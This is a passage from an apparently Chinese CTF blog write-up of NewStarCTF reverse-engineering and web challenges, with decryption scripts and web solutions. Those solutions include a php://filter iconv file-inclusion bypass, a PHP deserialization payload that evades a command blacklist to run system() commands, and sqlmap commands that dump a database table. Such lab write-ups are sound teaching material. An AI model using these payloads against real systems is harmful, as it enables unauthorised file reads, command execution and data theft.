<span class="number">0xCE</span>, <span class="number">0x55</span>, <span class="number">0x28</span>, <span class="number">0xDF</span>,    <span class="number">0x8C</span>, <span class="number">0xA1</span>, <span class="number">0x89</span>, <span class="number">0x0D</span>, <span class="number">0xBF</span>, <span class="number">0xE6</span>, <span class="number">0x42</span>, <span class="number">0x68</span>, <span class="number">0x41</span>, <span class="number">0x99</span>, <span class="number">0x2D</span>, <span class="number">0x0F</span>, <span class="number">0xB0</span>, <span class="number">0x54</span>, <span class="number">0xBB</span>, <span class="number">0x16</span> &#125;;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> enc[<span class="number">42</span>] = &#123;</span><br><span class="line">    <span class="number">0xEE</span>, <span class="number">0xE6</span>, <span class="number">0xD7</span>, <span class="number">0xB2</span>, <span class="number">0x8A</span>, <span class="number">0xAB</span>, <span class="number">0x13</span>, <span class="number">0x35</span>, <span class="number">0x02</span>, <span class="number">0x7B</span>, <span class="number">0xC9</span>, <span class="number">0xB9</span>, <span class="number">0x9C</span>, <span class="number">0xBA</span>, <span class="number">0xED</span>, <span class="number">0x2E</span>,<span class="number">0xBD</span>, <span class="number">0x4F</span>, <span class="number">0xFA</span>, <span class="number">0xEE</span>, <span class="number">0xC8</span>, <span class="number">0xF8</span>, <span class="number">0xE4</span>, <span class="number">0x16</span>, <span class="number">0x82</span>, <span class="number">0x63</span>, <span class="number">0x3B</span>, <span class="number">0x98</span>, <span class="number">0xF4</span>, <span class="number">0x14</span>, <span class="number">0x30</span>, <span class="number">0x38</span>,<span class="number">0x07</span>, <span class="number">0x36</span>, <span class="number">0x84</span>, <span class="number">0x3D</span>, <span class="number">0x0C</span>, <span class="number">0x36</span>, <span class="number">0x32</span>, <span class="number">0xEA</span>, <span class="number">0x55</span>, <span class="number">0xA6</span> &#125;;</span><br><span class="line">    <span class="type">int</span> s,i,j;</span><br><span class="line">    srand(<span class="number">0x7261745377654E</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">42</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> ran_num = rand();</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">256</span>; ++j)</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            s = Table[(<span class="number">16</span> * ((<span class="type">unsigned</span> <span class="type">char</span>)(j + ran_num % <span class="number">255</span>) &gt;&gt; <span class="number">4</span>) + <span class="number">15</span>) &amp; (<span class="type">unsigned</span> <span class="type">char</span>)(j + ran_num % <span class="number">255</span>)];</span><br><span class="line">            <span class="keyword">if</span> (s == enc[i])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, j);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="easy-enc"><a href="#easy-enc" class="headerlink" title="easy_enc"></a>easy_enc</h3><p>和上一个题其实是一个思路，主要也是要爆破，因为我们分析代码的时候发现在最后一个函数中，他有一个*58的操作，byte类型就溢出了，我们无法获取正确的加密后的函数，所以就可以进行单字节爆破，循环对数据进行加密操作，如果等于密文就输出原来的值就可以了</p>
<p>分析源码，一眼就是我们的加密后的数据，这些数据实际时连在一起的，但ida识别错误，我们可以通过对数据重新定义进行修改，或者直接动调去获取数据，因为他们是连在一起的</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.4gue0ombvhq0.webp" alt="image"></p>
<p>然后就是上面的加密函数，这一段的意义其实就是调用我们的4个加密函数，对我们的字符串进行加密操作</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j )</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(<span class="type">char</span> *))v8[j])(Str);</span><br></pre></td></tr></table></figure>

<p>分析第一个加密函数，判断数据的范围然后进行数据修改，第二个加密函数是加key的操作，key也告诉我们了，第三个是对字符进行~操作，上面也解释了他的操作，最后一个就是一个*58的操作，会造成溢出，所以我们不能简单的去逆向出算法，最后选择进行单字节爆破的方式进行操作</p>
<p>对于脚本的知识了解，__uint8_t 其实就是unsigned char，~按位取反运算是单目运算，用来求一个位串信息按位的反，即哪些为0的位，结果是1，而哪些为1的位，结果是0。k *&#x3D; 52;最后会溢出</p>
<p>我试过使用int类型时使用vstudio进行动态，最后的值会很大，使用unsigned char的意义在于正好存在溢出</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> enc[] =</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="number">0xE8</span>, <span class="number">0x80</span>, <span class="number">0x84</span>, <span class="number">0x08</span>, <span class="number">0x18</span>, <span class="number">0x3C</span>, <span class="number">0x78</span>, <span class="number">0x68</span>, <span class="number">0x00</span>, <span class="number">0x70</span>,</span><br><span class="line">      <span class="number">0x7C</span>, <span class="number">0x94</span>, <span class="number">0xC8</span>, <span class="number">0xE0</span>, <span class="number">0x10</span>, <span class="number">0xEC</span>, <span class="number">0xB4</span>, <span class="number">0xAC</span>, <span class="number">0x68</span>, <span class="number">0xA8</span>,</span><br><span class="line">      <span class="number">0x0C</span>, <span class="number">0x1C</span>, <span class="number">0x90</span>, <span class="number">0xCC</span>, <span class="number">0x54</span>, <span class="number">0x3C</span>, <span class="number">0x14</span>, <span class="number">0xDC</span>, <span class="number">0x30</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> k;</span><br><span class="line">    <span class="type">char</span> Str[] = <span class="string">&quot;NewStarCTF&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">29</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">char</span> j = <span class="number">32</span>; j &lt;= <span class="number">126</span>; j++) &#123;</span><br><span class="line">            k = j;</span><br><span class="line">            <span class="keyword">if</span> (k &lt; <span class="number">65</span> || k &gt; <span class="number">90</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (k &lt; <span class="number">48</span> || k &gt; <span class="number">57</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> (k &gt;= <span class="number">97</span> &amp;&amp; k &lt;=<span class="number">122</span>)</span><br><span class="line">                        k = (k - <span class="number">89</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    k = (k - <span class="number">45</span>) % <span class="number">10</span> + <span class="number">48</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                k = (k - <span class="number">52</span>) % <span class="number">26</span> + <span class="number">65</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            k += (<span class="type">int</span>)Str[i % <span class="built_in">strlen</span>(Str)];</span><br><span class="line">            k = ~k;</span><br><span class="line">            k *= <span class="number">52</span>;</span><br><span class="line">            <span class="keyword">if</span> (k == enc[i])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> ((j &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; j &lt;= <span class="string">&#x27;Z&#x27;</span>) || (j &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; j &lt;= <span class="string">&#x27;z&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, j);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="web-1"><a href="#web-1" class="headerlink" title="web"></a>web</h2><h3 id="include-0。0"><a href="#include-0。0" class="headerlink" title="include 0。0"></a>include 0。0</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Zeker62/p/15322771.html#phpfilter">✔PHP文件包含漏洞全面总结 - Zeker62 - 博客园 (cnblogs.com)</a></p>
<p>文件包含漏洞，可以使用各种伪协议进行读取文件，也分为本地文件包含和远程文件包含，本地文件包含就是可以使用比如</p>
<blockquote>
<p>file: &#x2F;&#x2F;伪协议<br>data:&#x2F;&#x2F; 伪协议<br>phar:&#x2F;&#x2F;伪协议<br>zip:&#x2F;&#x2F; 伪协议</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// FLAG in the flag.php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/base|rot/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">    @<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nope&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>分析源码，我们看到他对比普通的文件上传就多了一个base和rot的过滤，那么就是防止我们使用Conversion Filters中的base64</p>
<p>php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php </p>
<p>php:&#x2F;&#x2F;filter&#x2F;string.rot13&#x2F;resource&#x3D;flag.php </p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44657899/article/details/109300335">php:&#x2F;&#x2F;filter的各种过滤器_php:&#x2F;&#x2F;filter过滤器种类-CSDN博客</a></p>
<p>那么还有其他的很多过滤器，那么我们使用可以使用convert.iconv.*过滤器</p>
<blockquote>
<p>convert.iconv.<input-encoding>.<output-encoding>  or  convert.iconv.<input-encoding>&#x2F;<output-encoding></p>
</blockquote>
<p>那么我们就使用他utf-8和utf-7进行编码</p>
<blockquote>
<p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF-8.UTF-7&#x2F;resource&#x3D;flag.php</p>
</blockquote>
<p><img src="C:\Users\a\AppData\Roaming\Typora\typora-user-images\image-20231020200147972.png" alt="image-20231020200147972"></p>
<h3 id="Unserialize？"><a href="#Unserialize？" class="headerlink" title="Unserialize？"></a>Unserialize？</h3><p><a target="_blank" rel="noopener" href="https://lazzzaro.github.io/2020/05/15/web-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化 | Lazzaro (lazzzaro.github.io)</a></p>
<p>反序列化的题目</p>
<p>我们分析源码,看到这里只使用了一个魔法函数，destruct（#某个对象的所有引用都被删除或者销毁时调用（没有变量指到当前对象时也会被触发），那么只要我们可以看到一个对象evil，我们只是赋值后并没有调用它，那么就会触发，我们就需要写一个序列化后的数据，他反序列后就会执行并调用</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// Maybe you need learn some knowledge about deserialize?</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|tac|more|tail|base/i&quot;</span>, <span class="variable">$this</span>-&gt;cmd))&#123;</span><br><span class="line">            @<span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;unser&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们直接把他放到php的编译器中，首先调用这个对象，然后往里面传入值，这样就实现了调用类，并且system中的cmd赋予了命令</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span> = <span class="string">&#x27;nl /th1s_1s_fffflllll4444aaaggggg&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>= <span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<p>这里有个细节是cmd是私有变量，他的反序列和正常的反序列会有一点不同，但我发现在火狐是不可以直接穿的，但在谷歌浏览器的hackbar是可以的</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Xxy605/article/details/117336343">PHP——serialize()序列化类变量public、protected、private的区别_serialize变量名为protect_Ho1aAs的博客-CSDN博客</a></p>
<h3 id="游戏高手"><a href="#游戏高手" class="headerlink" title="游戏高手"></a>游戏高手</h3><p>一道游戏题目，我们直接去调试器里，查找和分数有关的名词，比如score</p>
<p>我们可以看到这个函数是就是管理如果分数达到100000就能看到flag</p>
<p><img src="C:\Users\a\AppData\Roaming\Typora\typora-user-images\image-20231021132353950.png" alt="image-20231021132353950"></p>
<p>我们直接去调试器里控制台里，输入games，他就会自动弹出gamescore，并且告诉你现在的分数，那么我们直接输入即可</p>
<p><img src="C:\Users\a\AppData\Roaming\Typora\typora-user-images\image-20231021132054978.png" alt="image-20231021132054978"></p>
<h3 id="ez-sql"><a href="#ez-sql" class="headerlink" title="ez_sql"></a>ez_sql</h3><p>sqlmap一把梭，我们首先在首页能看到几个按键，每个按键点击后都是一个get的传参，id&#x3D;xx，那么我直接抓包get传参的数据流，然后再sqlmap的主目录新建一个1.txt，存放这个数据流</p>
<p><img src="C:\Users\a\AppData\Roaming\Typora\typora-user-images\image-20231021132942254.png" alt="image-20231021132942254"></p>
<p>首先：</p>
<p>查询是否可以找到数据库</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -r 1.txt</span><br></pre></td></tr></table></figure>

<p>查数据库</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -r 1.txt -dbs --batch</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.2z3o4kl5wik0.webp" alt="image"></p>
<p>查表</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -r 1.txt -D ctf -tables --batch</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.12f1b96x3ti.webp" alt="image"></p>
<p>查字段</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -r 1.txt  -D ctf -T here_is_flag --columns --batch</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.7041926o0hs0.webp" alt="image"></p>
<p>查数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -r 1.txt  -D ctf -T here_is_flag -C flag --dump --batch</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.70u11xfx8z80.webp" alt="image"></p>
<p>当请求延时的时候使用–delay 1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -r 1.txt -dbs --batch --delay 1</span><br></pre></td></tr></table></figure>



<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_73051164/article/details/133955827">记录分析做过的两道无参数 RCE 题-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/pursue-security/p/15406272.html">RCE篇之无参数rce - 学安全的小白 - 博客园 (cnblogs.com)</a></p>
<h1 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h1><h2 id="STL"><a href="#STL" class="headerlink" title="STL"></a>STL</h2><p>一道C++逆向的题目，记录一下C++逆向的思路</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.6enz85e6lv40.webp"></p>
<p>分为作用域和函数，比如std就是一个作用域，我们可以分两种进行分辨</p>
<p>（1）对于一个语句，前面的全部都是作用域，只有最后是我们需要的函数</p>
<p>std::string::size(v13)</p>
<p>这一句就是前面std::string::都是作用域，直接看后面的size就知道他的作用是v13的长度</p>
<p>（2）除了这种情况就是中间不都是作用域，而是函数的值</p>
<p>v8 &#x3D; std::operator &lt;&lt;&lt;std::char_traits<char>&gt;(&amp;std::cout, “Wrong!!”);</p>
<p>例如以上这段，std以及中间这段就是作用域，我们可以读最后或者是作用域之后的值就是我们需要的函数比如这个就是对应着C++中的cout语句</p>
<p>cout &gt;&gt; ‘xxx’   对应上述就是利用的&lt;&lt;进行对应输出</p>
<p>std::reverse&lt;__gnu_cxx::__normal_iterator&lt;char *,std::string&gt;&gt;(v4, v3);</p>
<p>还有这段就是典型的，前面是作用域，后面就是函数，中间是作用域，对于后面要调用的数值的作用域，然后最后是引入的数值</p>
<p>我们分析逻辑：可以看到一开始是让你输入flag的值，存到v13中，且v13的值必须为44个大小，后续调用了re函数，对输入的数值进行逆置，然后对于逆置的数进行前后异或，本值等于本值与下一个值进行异或，</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( std::string::length(v13) != <span class="number">44</span> )</span><br><span class="line">    exit(<span class="number">0</span>);</span><br><span class="line">   </span><br><span class="line">std::reverse&lt;__gnu_cxx::__normal_iterator&lt;char*,std::string&gt;&gt;(v4, v3);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; (std::string::size(v13) - <span class="number">1</span>); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = *std::string::operator[](v13, i + <span class="number">1</span>);</span><br><span class="line">    v6 = std::string::operator[](v13, i);</span><br><span class="line">    *v6 ^= v5;</span><br></pre></td></tr></table></figure>



<p>PE指纹</p>
<p>MZ，PZ</p>
<h2 id="EzDLL"><a href="#EzDLL" class="headerlink" title="EzDLL"></a>EzDLL</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Rc4_Init</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* s, <span class="type">unsigned</span> <span class="type">char</span>* key, <span class="type">int</span> keylen)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Rc4_Crypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* s, <span class="type">unsigned</span> <span class="type">char</span>* data, <span class="type">int</span> datalen)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> key[] = <span class="string">&quot;WOWOWOWWOWOWOW&quot;</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> s[<span class="number">256</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> enc[] = &#123; <span class="number">0xF4</span>, <span class="number">0x87</span>, <span class="number">0xD4</span>, <span class="number">0xFA</span>, <span class="number">0x61</span>, <span class="number">0xA6</span>, <span class="number">0x71</span>, <span class="number">0x12</span>, <span class="number">0x75</span>, <span class="number">0x09</span>, <span class="number">0xFE</span>, <span class="number">0xD8</span>, <span class="number">0xE4</span>, <span class="number">0x38</span>, <span class="number">0x97</span>, <span class="number">0x51</span>, <span class="number">0xA8</span>, <span class="number">0xDF</span>, <span class="number">0x85</span>, <span class="number">0x65</span>, <span class="number">0xC2</span>, <span class="number">0xB2</span>, <span class="number">0x15</span>, <span class="number">0xEF</span>, <span class="number">0x1F</span>, <span class="number">0xEC</span>, <span class="number">0x69</span>, <span class="number">0xDD</span>, <span class="number">0x6E</span>, <span class="number">0xE9</span>, <span class="number">0xCF</span>, <span class="number">0x07</span>, <span class="number">0xAE</span>, <span class="number">0xC8</span>, <span class="number">0x17</span>, <span class="number">0xF0</span>, <span class="number">0x65</span>, <span class="number">0x72</span>, <span class="number">0xE6</span>, <span class="number">0x73</span>, <span class="number">0xA4</span>, <span class="number">0x0C</span>, <span class="number">0x87</span>, <span class="number">0x64</span>, <span class="number">0x9E</span>, <span class="number">0x9E</span>, <span class="number">0x71</span>, <span class="number">0x8C</span>, <span class="number">0x7F</span>, <span class="number">0xD7</span>, <span class="number">0x75</span>, <span class="number">0x84</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> keylen = <span class="built_in">strlen</span>((<span class="type">char</span>*)key);</span><br><span class="line"></span><br><span class="line">    Rc4_Init(s, key, keylen);</span><br><span class="line">    Rc4_Crypt(s, enc, <span class="keyword">sizeof</span>(enc));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Flag: &quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(enc); i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, enc[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Rc4_Init</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* s, <span class="type">unsigned</span> <span class="type">char</span>* key, <span class="type">int</span> keylen)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">        s[i] = i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">        j = (j + s[i] + key[i % keylen]) % <span class="number">256</span>;</span><br><span class="line">        <span class="type">char</span> temp = s[i];</span><br><span class="line">        s[i] = s[j];</span><br><span class="line">        s[j] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Rc4_Crypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* s, <span class="type">unsigned</span> <span class="type">char</span>* data, <span class="type">int</span> datalen)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i, j = <span class="number">0</span>, k = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> temp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; datalen; i++) &#123;</span><br><span class="line">        j = (j + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        k = (k + s[j]) % <span class="number">256</span>;</span><br><span class="line">        temp = s[j];</span><br><span class="line">        s[j] = s[k];</span><br><span class="line">        s[k] = temp;</span><br><span class="line">        data[i] ^= s[(s[j] + s[k]) % <span class="number">256</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


      
    </div>
    
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2023/10/02/SHCTF/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">&lt;</strong>
      <div class="article-nav-title">
        
          SHCTF
        
      </div>
    </a>
  
  
    <a href="/2023/09/23/re%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/" id="article-nav-older" class="article-nav-link-wrap">
      <div class="article-nav-title">re做题记录</div>
      <strong class="article-nav-caption">&gt;</strong>
    </a>
  
</nav>

  
</article>






</div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
      <div class="footer-left">
